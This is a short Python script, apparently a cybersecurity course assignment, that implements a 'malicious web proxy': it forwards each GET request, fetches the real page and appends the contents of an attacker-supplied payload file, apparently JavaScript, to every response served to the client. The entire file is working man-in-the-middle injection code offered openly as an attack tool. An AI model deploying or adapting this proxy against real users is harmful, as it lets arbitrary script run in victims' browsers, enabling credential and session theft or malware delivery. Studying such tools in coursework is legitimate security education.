import http.server
import urllib.request
import socketserver
import sys


#CYBERSECURITY PA2 MALICIOUS WEB PROXY BY JOHN(JACK) BLACKBURN
#COMPLETED ON 3-15-2022


if len(sys.argv) < 3:
    print('Usage: python3 mitm.py <port> <payload file>')
    exit(1)

class MaliciousProxy(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        print('[*] Got request for: {}'.format(self.path))
        self.send_response(200)
        self.end_headers()
        response = urllib.request.urlopen(self.path).read()
        javaS = open(sys.argv[2], "r")
        Mali = javaS.read()
        Mali = Mali.encode('utf-8')
        self.wfile.write(response+Mali)
        

port = int(sys.argv[1])
server = socketserver.ForkingTCPServer(('', port), MaliciousProxy)
print("[*] Serving on port {}".format(port))
server.serve_forever()